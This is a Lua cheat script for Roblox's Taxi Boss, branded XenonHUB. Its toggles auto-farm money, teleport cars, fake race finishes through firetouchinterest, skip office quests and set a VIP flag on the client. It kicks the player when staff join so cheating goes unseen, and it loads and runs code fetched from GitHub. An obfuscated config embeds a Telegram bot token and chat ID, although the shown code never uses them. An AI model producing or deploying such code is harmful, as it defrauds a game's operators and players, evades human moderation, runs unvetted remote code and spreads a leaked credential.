-- XenonHUB Secure Loader
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local TweenService = game:GetService("TweenService")
local RbxAnalytics = game:GetService("RbxAnalyticsService")
local MarketplaceService = game:GetService("MarketplaceService")
local Lighting = game:GetService("Lighting")

-- Secure encoding/decoding functions
local function decode(str)
    local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    str=string.gsub(str,'[^'..b..'=]','')
    return (str:gsub('.',function(x)
        if x=='=' then return '' end
        local r,f='',(b:find(x)-1)
        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
        return r
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?',function(x)
        if #x~=8 then return '' end
        local c=0
        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
        return string.char(c)
    end))
end

local function xorCipher(str, key)
    local result = ""
    for i = 1, #str do
        local byte = string.byte(str, i)
        local keyByte = string.byte(key, ((i-1) % #key) + 1)
        result = result .. string.char(bit32.bxor(byte, keyByte))
    end
    return result
end

local function encrypt(str)
    local key = RbxAnalytics:GetClientId()
    return xorCipher(str, key)
end

local function decrypt(str)
    local key = RbxAnalytics:GetClientId()
    return xorCipher(str, key)
end

-- Secure configuration
local secureConfig = {
    ["api_base"] = encrypt("aHR0cHM6Ly94ZW5vbmh1Yi54eXo="),
    ["api_endpoint"] = encrypt("L2FwaS92YWxpZGF0ZS1rZXk="),
    ["bot_token"] = encrypt("Njc4NDIzNTUyNTpBQUh1NFZ0bVAtRmhhZ081cGJhVkpfVmVRbjI5bHZvaUh2Zw=="),
    ["chat_id"] = encrypt("MTcyMjA5MTk5MA==")
}

local function getSecureValue(key)
    return decode(decrypt(secureConfig[key]))
end

-- Constants
local CONFIG = {
    COLORS = {
        BACKGROUND = Color3.fromRGB(25, 25, 35),
        CONTAINER = Color3.fromRGB(30, 30, 40),
        TEXTBOX = Color3.fromRGB(45, 45, 55),
        LOADING_BG = Color3.fromRGB(40, 40, 50),
        LOADING_BAR = Color3.fromRGB(0, 170, 255),
        GET_KEY_BUTTON = Color3.fromRGB(0, 120, 215),
        SUBMIT_BUTTON = Color3.fromRGB(0, 170, 0),
        TEXT = Color3.fromRGB(255, 255, 255),
        ERROR = Color3.fromRGB(255, 0, 0),
        SUCCESS = Color3.fromRGB(0, 255, 0)
    },
    KEY_FILE_PATH = "XenonHUB_Key.txt"
}

-- Secure HTTP request function
local function secureRequest(url, method, body)
    local success, response = pcall(function()
        return http_request({
            Url = url,
            Method = method or "GET",
            Headers = {
                ["Content-Type"] = "application/json",
                ["X-Security-Token"] = RbxAnalytics:GetClientId()
            },
            Body = body and HttpService:JSONEncode(body) or nil
        })
    end)
    
    if not success then
        return nil, "Connection error"
    end
    
    return response
end

-- GUI Creation Functions
local function createScreenGui()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "XenonHUBKey"
    screenGui.ResetOnSpawn = false
    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    screenGui.DisplayOrder = 999
    screenGui.Parent = Players.LocalPlayer:WaitForChild("PlayerGui")
    return screenGui
end

local function createMainFrame(parent)
    local mainFrame = Instance.new("Frame")
    mainFrame.Name = "MainFrame"
    mainFrame.Size = UDim2.new(0, 400, 0, 300)
    mainFrame.Position = UDim2.new(0.5, -200, 0.5, -150)
    mainFrame.BackgroundColor3 = CONFIG.COLORS.BACKGROUND
    mainFrame.BorderSizePixel = 0
    mainFrame.Active = true
    mainFrame.Draggable = true
    mainFrame.Parent = parent
    return mainFrame
end

local function createBlurEffect()
    local blurEffect = Instance.new("BlurEffect")
    blurEffect.Size = 10
    blurEffect.Parent = Lighting
    return blurEffect
end

local function createContainer(parent)
    local container = Instance.new("Frame")
    container.Name = "Container"
    container.Size = UDim2.new(0.9, 0, 0.9, 0)
    container.Position = UDim2.new(0.05, 0, 0.05, 0)
    container.BackgroundColor3 = CONFIG.COLORS.CONTAINER
    container.BorderSizePixel = 0
    container.Parent = parent
    return container
end

local function createTitle(parent)
    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, 0, 0, 40)
    title.Position = UDim2.new(0, 0, 0.05, 0)
    title.BackgroundTransparency = 1
    title.Font = Enum.Font.GothamBold
    title.Text = "XenonHUB"
    title.TextColor3 = CONFIG.COLORS.TEXT
    title.TextSize = 24
    title.Parent = parent
    return title
end

local function createTextBox(parent)
    local textBox = Instance.new("TextBox")
    textBox.Size = UDim2.new(0.8, 0, 0, 40)
    textBox.Position = UDim2.new(0.1, 0, 0.3, 0)
    textBox.BackgroundColor3 = CONFIG.COLORS.TEXTBOX
    textBox.BorderSizePixel = 0
    textBox.Font = Enum.Font.Gotham
    textBox.PlaceholderText = "Enter Key Here"
    textBox.PlaceholderColor3 = Color3.fromRGB(180, 180, 180)
    textBox.Text = ""
    textBox.TextColor3 = CONFIG.COLORS.TEXT
    textBox.TextSize = 14
    textBox.ClearTextOnFocus = false
    textBox.Parent = parent
    return textBox
end

local function createLoadingElements(parent)
    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0.8, 0, 0, 6)
    frame.Position = UDim2.new(0.1, 0, 0.5, 0)
    frame.BackgroundColor3 = CONFIG.COLORS.LOADING_BG
    frame.BorderSizePixel = 0
    frame.Visible = false
    frame.Parent = parent

    local bar = Instance.new("Frame")
    bar.Size = UDim2.new(0, 0, 1, 0)
    bar.BackgroundColor3 = CONFIG.COLORS.LOADING_BAR
    bar.BorderSizePixel = 0
    bar.Parent = frame

    local text = Instance.new("TextLabel")
    text.Size = UDim2.new(1, 0, 0, 20)
    text.Position = UDim2.new(0, 0, 0.6, 0)
    text.BackgroundTransparency = 1
    text.Font = Enum.Font.Gotham
    text.Text = ""
    text.TextColor3 = CONFIG.COLORS.TEXT
    text.TextSize = 14
    text.Parent = parent

    return frame, bar, text
end

local function createButton(parent, text, position, color)
    local button = Instance.new("TextButton")
    button.Size = UDim2.new(0.35, 0, 0, 40)
    button.Position = position
    button.BackgroundColor3 = color
    button.BorderSizePixel = 0
    button.Font = Enum.Font.GothamBold
    button.Text = text
    button.TextColor3 = CONFIG.COLORS.TEXT
    button.TextSize = 14
    button.Parent = parent
    return button
end

local function createStatusLabel(parent)
    local status = Instance.new("TextLabel")
    status.Size = UDim2.new(1, 0, 0, 20)
    status.Position = UDim2.new(0, 0, 0.85, 0)
    status.BackgroundTransparency = 1
    status.Font = Enum.Font.Gotham
    status.Text = ""
    status.TextColor3 = CONFIG.COLORS.TEXT
    status.TextSize = 14
    status.Parent = parent
    return status
end

local function addCorner(instance, radius)
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, radius or 8)
    corner.Parent = instance
end

local function addHoverEffect(button)
    local originalColor = button.BackgroundColor3
    local lighterColor = Color3.new(
        math.min(originalColor.R + 0.1, 1),
        math.min(originalColor.G + 0.1, 1),
        math.min(originalColor.B + 0.1, 1)
    )
    
    button.MouseEnter:Connect(function()
        TweenService:Create(button, TweenInfo.new(0.2), {BackgroundColor3 = lighterColor}):Play()
    end)
    
    button.MouseLeave:Connect(function()
        TweenService:Create(button, TweenInfo.new(0.2), {BackgroundColor3 = originalColor}):Play()
    end)
end

-- UI State Management
local function showLoading(loadingFrame, loadingBar, loadingText, text, callback)
    loadingFrame.Visible = true
    loadingText.Text = text
    loadingBar.Size = UDim2.new(0, 0, 1, 0)
    
    local loadingTween = TweenService:Create(loadingBar, 
        TweenInfo.new(1, Enum.EasingStyle.Linear), 
        {Size = UDim2.new(1, 0, 1, 0)}
    )
    
    loadingTween.Completed:Connect(function()
        if callback then
            callback()
        end
    end)
    
    loadingTween:Play()
    return loadingTween
end

local function hideLoading(loadingFrame, loadingText)
    loadingFrame.Visible = false
    loadingText.Text = ""
end

local function showStatus(statusLabel, message, color)
    statusLabel.Text = message
    statusLabel.TextColor3 = color or CONFIG.COLORS.TEXT
    task.delay(3, function()
        if statusLabel then
            statusLabel.Text = ""
        end
    end)
end

local function showNotification(screenGui, message, duration)
    local notification = Instance.new("TextLabel")
    notification.Size = UDim2.new(0, 300, 0, 50)
    notification.Position = UDim2.new(0.5, -150, 0.7, 0)
    notification.BackgroundColor3 = CONFIG.COLORS.BACKGROUND
    notification.TextColor3 = CONFIG.COLORS.TEXT
    notification.BackgroundTransparency = 0.3
    notification.TextScaled = true
    notification.Font = Enum.Font.SourceSans
    notification.Text = message
    notification.Parent = screenGui
    notification.ZIndex = 10

    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 10)
    corner.Parent = notification

    task.delay(duration or 3, function()
        notification:Destroy()
    end)
end

----------------MAIN ---------------------------------------------------------------

-- Tunggu hingga game dimuat
repeat task.wait(0.25) until game:IsLoaded();

-- Atur gambar dan toggle key untuk Fluent UI
getgenv().Image = "rbxassetid://101547663996049"; -- Masukkan asset id di sini
getgenv().ToggleUI = "LeftControl" -- Tombol untuk menyalakan/mematikan UI Fluent

-- Fungsi untuk memuat UI di pojok kiri
task.spawn(function()
    if not getgenv().LoadedMobileUI == true then 
        getgenv().LoadedMobileUI = true
        local OpenUI = Instance.new("ScreenGui");
        local ImageButton = Instance.new("ImageButton");
        local UICorner = Instance.new("UICorner");
        OpenUI.Name = "OpenUI";
        OpenUI.Parent = game:GetService("CoreGui");
        OpenUI.ZIndexBehavior = Enum.ZIndexBehavior.Sibling;
        ImageButton.Parent = OpenUI;
        ImageButton.BackgroundColor3 = Color3.fromRGB(105, 105, 105);
        ImageButton.BackgroundTransparency = 1;
        ImageButton.Position = UDim2.new(0.1, 0, 0.1, 0); -- Mengubah posisi ke kiri
        ImageButton.Size = UDim2.new(0, 100, 0, 100);
        ImageButton.Image = getgenv().Image;
        ImageButton.Draggable = true;
        UICorner.CornerRadius = UDim.new(0, 200);
        UICorner.Parent = ImageButton;
        ImageButton.MouseButton1Click:Connect(function()
            game:GetService("VirtualInputManager"):SendKeyEvent(true, getgenv().ToggleUI, false, game);
        end)
    end
end)

local Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()

local Window = Fluent:CreateWindow({
    Title = "Taxi Boss " .. Fluent.Version,
    SubTitle = "by XenonHUB",
    TabWidth = 160,
    Size = UDim2.fromOffset(580, 360),
    Acrylic = true, 
    Theme = "Dark",
    MinimizeKey = Enum.KeyCode.LeftControl 
})

local Tabs = {
    Main = Window:AddTab({ Title = "Main", Icon = "home" }),
    Info = Window:AddTab({ Title = "Info", Icon = "info" }) -- Tab baru untuk Info
}

-- Identifikasi executor yang sedang digunakan
local executor = identifyexecutor and identifyexecutor() or "Unknown"

-- Informasi pemain
local VirtualUser = game:GetService("VirtualUser")
local Players = game:GetService("Players")
local player = game.Players.LocalPlayer
local accountAge = player.AccountAge
local isPremium = player.MembershipType == Enum.MembershipType.Premium
local accountCreatedDate = os.date("%Y-%m-%d", os.time() - (accountAge * 86400))

-- Tambahkan paragraph untuk info di tab Info
Tabs.Info:AddParagraph({
    Title = "Executor",
    Content = "Current Executor: " .. executor
})

Tabs.Info:AddParagraph({
    Title = "Account Age",
    Content = "Account Age (days): " .. accountAge
})

Tabs.Info:AddParagraph({
    Title = "Premium Status",
    Content = "Is Premium: " .. tostring(isPremium)
})

Tabs.Info:AddParagraph({
    Title = "Account Created",
    Content = "Account Created: " .. accountCreatedDate
})

Tabs.Info:AddParagraph({
    Title = "Discord",
    Content = "https://discord.gg/3ZQBHpfQ5X"
})

Tabs.Info:AddButton({
    Title = "Copy Link Discord",
    Callback = function()
        setclipboard("https://discord.com/invite/cF8YeDPt2G")
    end
})

local vu = game:GetService("VirtualUser")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

-- Anti-AFK System
LocalPlayer.Idled:Connect(function()
    vu:Button2Down(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
    wait(1)
    vu:Button2Up(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
end)

-- Fungsi untuk kick player jika ada staff masuk
local function handleStaffCheck(player)
    if player:GetRankInGroup(11987919) > 149 then
        LocalPlayer:Kick("Auto Kicked: Staff Member " .. player.Name .. " joined your game.")
    end
end

-- Kick jika staff sudah ada di game saat script dijalankan
for _, player in ipairs(Players:GetPlayers()) do
    handleStaffCheck(player)
end

-- Kick jika ada player baru yang masuk dan ternyata staff
Players.PlayerAdded:Connect(function(player)
    handleStaffCheck(player)
end)

-- Looping tambahan untuk pengecekan setiap 5 detik
spawn(function()
    while true do
        wait(5)
        for _, player in ipairs(Players:GetPlayers()) do
            handleStaffCheck(player)
        end
    end
end)



local Toggle = Tabs.Main:AddToggle("MyToggle", {Title = "Auto Get Money", Default = false })

Toggle:OnChanged(function(state)
    getfenv().test2 = (state and true or false)
    pcall(function()
        game:GetService("ReplicatedStorage").Quests.Contracts.CancelContract:InvokeServer(game:GetService("Players").LocalPlayer.ActiveQuests:FindFirstChildOfClass("StringValue").Name)
        game:GetService("ReplicatedStorage").Quests.Contracts.CancelContract:InvokeServer(game:GetService("Players").LocalPlayer.ActiveQuests:FindFirstChildOfClass("StringValue").Name)
        end)
        while getfenv().test2 do
            wait()
            if not  game:GetService("Players").LocalPlayer.ActiveQuests:FindFirstChild("contractBuildMaterial") then
                game:GetService("ReplicatedStorage").Quests.Contracts.StartContract:InvokeServer("contractBuildMaterial")
        repeat task.wait()
        until game:GetService("Players").LocalPlayer.ActiveQuests:FindFirstChild("contractBuildMaterial")
            end
        repeat task.wait()
        task.spawn(function()
        game:GetService("ReplicatedStorage").Quests.DeliveryComplete:InvokeServer("contractMaterial")
        game:GetService("ReplicatedStorage").Quests.DeliveryComplete:InvokeServer("contractMaterial")
        game:GetService("ReplicatedStorage").Quests.DeliveryComplete:InvokeServer("contractMaterial")
        end)
        until game:GetService("Players").LocalPlayer.ActiveQuests.contractBuildMaterial.Value == "!pw5pi3ps2"
        wait()
        game:GetService("ReplicatedStorage").Quests.Contracts.CompleteContract:InvokeServer()
        end
end)



local Toggle = Tabs.Main:AddToggle("MyToggle", {Title = "Auto Customer", Default = false })

Toggle:OnChanged(function(state)
    getfenv().customersfarm = state
    pcall(function()
        game:GetService("Workspace").GaragePlate:Destroy()
    end)

    for _, v in pairs(game:GetService("Workspace").World.Industrial.Port:GetChildren()) do
        if string.find(v.Name, "Container") then
            v:Destroy()
        end
    end

    getfenv().numbers = 0
    getfenv().stuck = 0
    local testvalue = 1
    local ohsoso = false
    local antiban = 0

    while getfenv().customersfarm do
        wait()
        pcall(function()
            local player = game.Players.LocalPlayer
            local character = player.Character
            local humanoid = character and character:FindFirstChild("Humanoid")
            local seatPart = humanoid and humanoid.SeatPart

            if seatPart then
                local car = seatPart.Parent.Parent
                local raycastParams = RaycastParams.new()
                raycastParams.FilterDescendantsInstances = {character, car, workspace.Camera}
                raycastParams.FilterType = Enum.RaycastFilterType.Exclude
                raycastParams.IgnoreWater = true

                if player.variables.inMission.Value and not workspace.ParkingMarkers:FindFirstChild("destinationPart") then
                    antiban += 1
                    wait(1)
                elseif antiban > 10 then
                    player:Kick("Kicked due to game glitch")
                end

                if player.variables.inMission.Value and workspace.ParkingMarkers:FindFirstChild("destinationPart") and player:DistanceFromCharacter(workspace.ParkingMarkers.destinationPart.Position) < 50 then
                    car:SetPrimaryPartCFrame(workspace.ParkingMarkers.destinationPart.CFrame + Vector3.new(0, 3, 0))
                    car.PrimaryPart.Velocity = Vector3.zero
                    game:GetService("VirtualInputManager"):SendKeyEvent(true, 304, false, game)
                    wait(1)
                    car:SetPrimaryPartCFrame(workspace.ParkingMarkers.destinationPart.CFrame + Vector3.new(0, 3, 0))
                    car.PrimaryPart.Velocity = Vector3.zero
                    game:GetService("VirtualInputManager"):SendKeyEvent(true, 304, false, game)
                    wait()

                    local dcframe = workspace.ParkingMarkers.destinationPart.CFrame
                    repeat
                        wait()
                        if (car.PrimaryPart.Position - dcframe.Position).magnitude > 3 then
                            car.PrimaryPart.Velocity = Vector3.zero
                            car:PivotTo(dcframe)
                            wait(0.1)
                            game:GetService("VirtualInputManager"):SendKeyEvent(true, 304, false, game)
                            car.PrimaryPart.Velocity = Vector3.zero
                        end
                    until not workspace.ParkingMarkers:FindFirstChild("destinationPart") or not getfenv().customersfarm

                    antiban = 0
                    game:GetService("VirtualInputManager"):SendKeyEvent(false, 304, false, game)
                    getfenv().numbers += 1
                    testvalue = 1
                    task.wait()
                elseif workspace:Raycast(character.HumanoidRootPart.Position, Vector3.new(0, -100, 0), raycastParams).Instance.Name == "Terrain" and not ohsoso then
                    local closestRoad, distance = nil, math.huge
                    for _, road in pairs(workspace.World:GetDescendants()) do
                        if road:IsA("Part") and (string.find(road.Name, "road") or string.find(road.Name, "Road")) then
                            local dist = (character.HumanoidRootPart.Position - road.Position).magnitude
                            if dist < distance then
                                closestRoad, distance = road, dist
                            end
                        end
                    end
                    if closestRoad then
                        car:PivotTo(closestRoad.CFrame)
                        ohsoso = true
                    end
                elseif player.variables.inMission.Value then
                    testvalue = testvalue - 0.02
                    if testvalue < 0 then
                        local closestRoad, distance = nil, math.huge
                        for _, road in pairs(workspace.World:GetDescendants()) do
                            if road:IsA("Part") and (string.find(road.Name, "road") or string.find(road.Name, "Road")) then
                                local dist = (character.HumanoidRootPart.Position - road.Position).magnitude
                                if dist < distance then
                                    closestRoad, distance = road, dist
                                end
                            end
                        end
                        if closestRoad then
                            car:PivotTo(closestRoad.CFrame)
                            getfenv().stuck += 1
                            testvalue = 1
                        end
                    end

                    pcall(function()
                        local PathfindingService = game:GetService("PathfindingService")
                        local part1 = character.HumanoidRootPart
                        local part2 = workspace.ParkingMarkers.destinationPart
                        local destination = part1.CFrame:lerp(part2.CFrame, testvalue)
                        local iguess = Vector3.new(destination.X, part2.Position.Y, destination.Z)

                        local path = PathfindingService:CreatePath({
                            AgentRadius = 20
                        })
                        path:ComputeAsync(car.PrimaryPart.Position, iguess)
                        local waypoints = path:GetWaypoints()

                        for _, waypoint in pairs(waypoints) do
                            local part = Instance.new("Part")
                            part.Shape = "Ball"
                            part.Size = Vector3.new(0.6, 0.6, 0.6)
                            part.Position = waypoint.Position
                            part.Anchored = true
                            part.CanCollide = false
                            part.Parent = workspace

                            if not workspace:Raycast(waypoint.Position, Vector3.new(0, 1000, 0), raycastParams) then
                                car:PivotTo(part.CFrame + Vector3.new(0, 5, 0))
                                part:Destroy()
                                testvalue = 1
                                task.wait(0.009)
                            else
                                part:Destroy()
                                testvalue = 1
                            end
                        end
                    end)
                elseif not player.variables.inMission.Value then
                    local closestCustomer, distance = nil, math.huge
                    for _, customer in pairs(workspace.NewCustomers:GetDescendants()) do
                        if customer.Name == "Part" and customer:GetAttribute("GroupSize") and customer:FindFirstChildOfClass("CFrameValue") and player.variables.seatAmount.Value > customer:GetAttribute("GroupSize") and customer:GetAttribute("Rating") < player.variables.vehicleRating.Value then
                            local dist = (customer.Position - customer:FindFirstChildOfClass("CFrameValue").Value.Position).magnitude
                            if dist < distance then
                                closestCustomer, distance = customer, dist
                            end
                        end
                    end
                    if closestCustomer then
                        for _, vehicle in pairs(workspace.Vehicles:GetDescendants()) do
                            if vehicle.Name == "Player" and vehicle.Value == player then
                                vehicle.Parent.Parent:SetPrimaryPartCFrame(closestCustomer.CFrame * CFrame.new(0, 3, 0))
                                wait(1)
                                fireproximityprompt(closestCustomer.Client.PromptPart.CustomerPrompt)
                                wait(3)
                            end
                        end
                    end
                end
            elseif not seatPart then
                game:GetService("ReplicatedStorage").Vehicles.GetNearestSpot:InvokeServer(player.variables.carId.Value)
                wait(0.5)
                game:GetService("ReplicatedStorage").Vehicles.EnterVehicleEvent:InvokeServer()
            end
        end)
    end
end)


local Toggle = Tabs.Main:AddToggle("MyToggle", {Title = "Auto Trophies", Default = false})

Toggle:OnChanged(function(state)
    -- Mengatur status Trophies dan UI
    getfenv().Trophies = state
    game:GetService("ReplicatedStorage").Race.LeaveRace:InvokeServer()
    getfenv().showui = getfenv().Trophies

    -- Spawn fungsi untuk menampilkan atau menghapus label 'Rep'
    spawn(function()
        local PlayerGui = game:GetService("Players").LocalPlayer.PlayerGui
        local MoneyGui = PlayerGui.ScreenGui.Money

        if not getfenv().showui and MoneyGui:FindFirstChild("Rep") then
            MoneyGui.Rep:Destroy()
        else
            while getfenv().showui do
                task.wait()
                if not MoneyGui:FindFirstChild("Rep") then
                    local clonedLabel = MoneyGui.CashLabel:Clone()
                    clonedLabel.Name = "Rep"
                    clonedLabel.Parent = MoneyGui
                    clonedLabel.Position = UDim2.new(3, 0, 0, 0)
                end
                -- Update teks 'Rep' sesuai nilai variabel
                MoneyGui.Rep.Text = "Rep:" .. tostring(game:GetService("Players").LocalPlayer.variables.rep.Value)
            end
        end
    end)

    -- Loop utama untuk fitur 'Auto Trophies'
    spawn(function()
        while getfenv().Trophies do
            task.wait()
            pcall(function()
                local player = game.Players.LocalPlayer
                local character = player.Character
                local humanoid = character and character:FindFirstChildOfClass("Humanoid")

                if humanoid and humanoid.Sit then
                    if player.variables.race.Value == "none" then
                        task.wait()
                        game:GetService("ReplicatedStorage").Race.TimeTrial:InvokeServer("circuit", 5)
                    else
                        for _, vehicle in pairs(game:GetService("Workspace").Vehicles:GetDescendants()) do
                            if vehicle.Name == "Player" and vehicle.Value == player then
                                for _, detect in pairs(game:GetService("Workspace").Races["circuit"].detects:GetChildren()) do
                                    if detect:IsA("Part") and detect:FindFirstChild("TouchInterest") then
                                        detect.CFrame = character.HumanoidRootPart.CFrame
                                        firetouchinterest(vehicle.Parent.Parent.PrimaryPart, detect, 0)
                                        firetouchinterest(vehicle.Parent.Parent.PrimaryPart, detect, 1)
                                    end
                                end
                                local finishPart = game:GetService("Workspace").Races["circuit"].timeTrial:FindFirstChildOfClass("IntValue").finish
                                finishPart.CFrame = character.HumanoidRootPart.CFrame
                                firetouchinterest(vehicle.Parent.Parent.PrimaryPart, finishPart, 0)
                                firetouchinterest(vehicle.Parent.Parent.PrimaryPart, finishPart, 1)
                            end
                        end
                    end
                else
                    game:GetService("ReplicatedStorage").Vehicles.GetNearestSpot:InvokeServer(player.variables.carId.Value)
                    wait(0.5)
                    game:GetService("ReplicatedStorage").Vehicles.EnterVehicleEvent:InvokeServer()
                end
            end)
        end
    end)
end)


local Toggle = Tabs.Main:AddToggle("MyToggle", {Title = "Auto TimeTrial Medals", Default = false})

Toggle:OnChanged(function(state)
    getfenv().medals = (state and true or false)
    game:GetService("ReplicatedStorage").Race.LeaveRace:InvokeServer()
    while getfenv().medals  do
         task.wait()
   if game.Players.LocalPlayer.Character.Humanoid.Sit == true then
     for round=1,3 do
     for what,races in pairs(game:GetService("Workspace").Races:GetChildren()) do
       if races.ClassName == "Folder" and getfenv().medals then
  game:GetService("ReplicatedStorage").Race.TimeTrial:InvokeServer(races.Name, round)
  wait()
  if game:GetService("Players").LocalPlayer.variables.race.Value == "none" then
     task.wait()
  game:GetService("ReplicatedStorage").Race.TimeTrial:InvokeServer(races.Name, round)
  else
     for a,b in pairs(game:GetService("Workspace").Vehicles:GetDescendants()) do
     if b.Name == "Player" and b.Value == game.Players.LocalPlayer then
   repeat wait()
  for i,v in pairs(game:GetService("Workspace").Races[races.Name].detects:GetChildren()) do
     if v.ClassName == "Part" and v:FindFirstChild("TouchInterest") then
        v.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
         firetouchinterest(b.Parent.Parent.PrimaryPart,v,0)
                 firetouchinterest(b.Parent.Parent.PrimaryPart,v,1)
     end
  end
  until game:GetService("Workspace").Races[races.Name].timeTrial:FindFirstChildOfClass("IntValue") or getfenv().medals == false
  repeat wait()
   for i,v in pairs(game:GetService("Workspace").Races[races.Name].detects:GetChildren()) do
     if v.ClassName == "Part" and v:FindFirstChild("TouchInterest") then
        v.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
         firetouchinterest(b.Parent.Parent.PrimaryPart,v,0)
                 firetouchinterest(b.Parent.Parent.PrimaryPart,v,1)
     end
  end
   pcall(function()
   game:GetService("Workspace").Races[races.Name].timeTrial:FindFirstChildOfClass("IntValue").finish.CFrame=game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
  firetouchinterest(b.Parent.Parent.PrimaryPart,game:GetService("Workspace").Races[races.Name].timeTrial:FindFirstChildOfClass("IntValue").finish,0)
                 firetouchinterest(b.Parent.Parent.PrimaryPart,game:GetService("Workspace").Races[races.Name].timeTrial:FindFirstChildOfClass("IntValue").finish,1)
  end)
  until game:GetService("Players").LocalPlayer.variables.race.Value == "none" or getfenv().medals == false
  end
  end 
  end
  
  end
  end
  end
  elseif game.Players.LocalPlayer.Character.Humanoid.Sit == false then
     game:GetService("ReplicatedStorage").Vehicles.GetNearestSpot:InvokeServer(game:GetService("Players").LocalPlayer.variables.carId.Value)
     wait(0.5)
     game:GetService("ReplicatedStorage").Vehicles.EnterVehicleEvent:InvokeServer()
  end
     end
end)


local Toggle = Tabs.Main:AddToggle("MyToggle", {Title = "Auto Upgrade Office", Default = false})

Toggle:OnChanged(function(state)
    getfenv().ofs = (state and true or false)
    while getfenv().ofs do
        wait()
    if not game:GetService("Players").LocalPlayer:FindFirstChild("Office") then
    game:GetService("ReplicatedStorage").Company.StartOffice:InvokeServer()
    wait(0.2)
    end
    if game:GetService("Players").LocalPlayer.Office:GetAttribute("level") <16 then
    game:GetService("ReplicatedStorage").Company.SkipOfficeQuest:InvokeServer()
    game:GetService("ReplicatedStorage").Company.UpgradeOffice:InvokeServer()
    end
    end
end)


Tabs.Main:AddButton({
    Title = "Unlock Taxi Radar",
    Description = "",
    Callback = function()
    game:GetService("Players").LocalPlayer.variables.vip.Value = true
    end
})